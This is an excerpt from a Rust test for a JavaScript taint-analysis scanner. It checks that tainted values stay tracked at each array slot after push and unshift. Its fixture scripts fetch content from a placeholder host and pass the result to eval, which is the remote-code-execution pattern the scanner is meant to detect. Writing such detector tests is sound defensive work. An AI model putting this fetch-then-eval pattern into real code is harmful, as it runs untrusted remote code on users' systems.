...
#[test]
fn array_push_and_unshift_keep_taint_at_each_slot() {
    let root = temporary_directory("array-mutation-slots");
    fs::write(
        root.join("positive.js"),
        br#"async function boot() {
  const items = [];
  items.push(fetch('https://example.invalid/control'));
...
boot();"#,
    ...
    fs::write(
        ...
        br#"async function boot() {
  const items = [];
  items.unshift('constant', fetch('https://example.invalid/content'));
  const [value] = await Promise.all(items);
  eval(value);
}
boot();"#,
    )
